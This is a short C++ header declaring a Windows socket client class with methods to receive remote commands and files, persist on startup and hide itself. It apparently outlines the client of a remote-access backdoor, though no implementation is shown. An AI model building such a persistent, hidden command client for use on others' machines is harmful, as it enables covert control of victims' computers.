#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <thread>
#include <string>
#include <windows.h>
#include <tlhelp32.h>
#include <fcntl.h>
#include <unistd.h>
#include <fstream>
#include <algorithm>


using namespace std;

class Client {
	WSADATA wsa;
	SOCKET client_socket = 0;
	
	std::string server_ip;
	struct sockaddr_in server_info;

public:
	bool is_connected = false;
	void GetServerIP();
	void CreateSocket();
	void ConnectToServer();
	void ReceiveCommands();
	void ReceiveFile();

	void CheckCommand(char* cmd);
	bool CheckProcess(std::string proc);
	void Reconnect();

	void Announcement(std::string msg);
	void Error(std::string msg);
	void SaveOnStartUp();
	void Hide();
};